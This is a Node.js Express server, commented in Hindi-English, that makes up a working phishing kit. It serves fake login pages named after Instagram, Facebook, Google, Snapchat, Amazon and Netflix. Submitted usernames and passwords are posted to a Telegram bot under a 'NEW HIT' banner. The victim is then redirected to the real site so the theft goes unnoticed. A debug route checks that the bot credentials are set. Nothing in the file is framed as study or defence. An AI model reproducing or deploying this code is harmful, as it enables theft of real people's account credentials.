const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();

// --- CONFIGURATION (Vercel ke Environment Variables se aayega) ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// --- LIE DETECTOR (DEBUG) ROUTE ---
// Yeh naya hissa hai sach ka pata lagane ke liye
app.get('/debug', (req, res) => {
    res.status(200).send(`
        <h1>Vercel Lie Detector Test Results</h1>
        <p><strong>BOT_TOKEN Status:</strong> ${BOT_TOKEN ? 'FOUND ✅' : 'MISSING ❌'}</p>
        <p><strong>CHAT_ID Status:</strong> ${CHAT_ID ? 'FOUND ✅' : 'MISSING ❌'}</p>
        <hr>
        <p>Agar koi bhi variable 'MISSING' hai, to tumne Vercel par Environment Variables galat daale hain.</p>
    `);
});
// --- END OF LIE DETECTOR ---


const redirectMap = {
    'Instagram': 'https://www.instagram.com',
    'Facebook': 'https://www.facebook.com',
    'Google': 'https://www.google.com',
    'Snapchat': 'https://www.snapchat.com',
    'Amazon': 'https://www.amazon.com',
    'Netflix': 'https://www.netflix.com'
};

app.use(bodyParser.urlencoded({ extended: true }));

// Dynamic page server
app.get('/', (req, res) => {
    const service = req.query.service;
    if (service && redirectMap[service]) {
        res.sendFile(path.join(__dirname, 'pages', service.toLowerCase() + '.html'));
    } else {
        res.status(404).send('Service Not Found. Use a valid service link or go to /debug to check config.');
    }
});

// Data catcher
app.post('/login-data', (req, res) => {
    const { username, password, service } = req.body;
    if (!username || !password || !service) return res.status(400).send("Missing data from form.");
    
    // Check if variables are loaded before sending
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error("FATAL: Cannot send message. BOT_TOKEN or CHAT_ID is missing on Vercel.");
        return res.status(500).send("Server configuration error. Cannot send data.");
    }

    const message = `💎✨ **!! NEW HIT !!** ✨💎\n▬▬▬▬▬▬▬▬▬▬▬▬\n🎯 **Service:** *${service}*\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n▬▬▬▬▬▬▬▬▬▬▬▬`;
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    axios.post(telegramApiUrl, {
        chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'
    })
    .then(() => res.redirect(redirectMap[service]))
    .catch(error => {
        console.error("Telegram API Error:", error.response ? error.response.data : error.message);
        // Hum yahaan error dikha rahe hain, jo tum dekh rahe ho
        res.status(500).send("Error sending data.");
    });
});

module.exports = app;
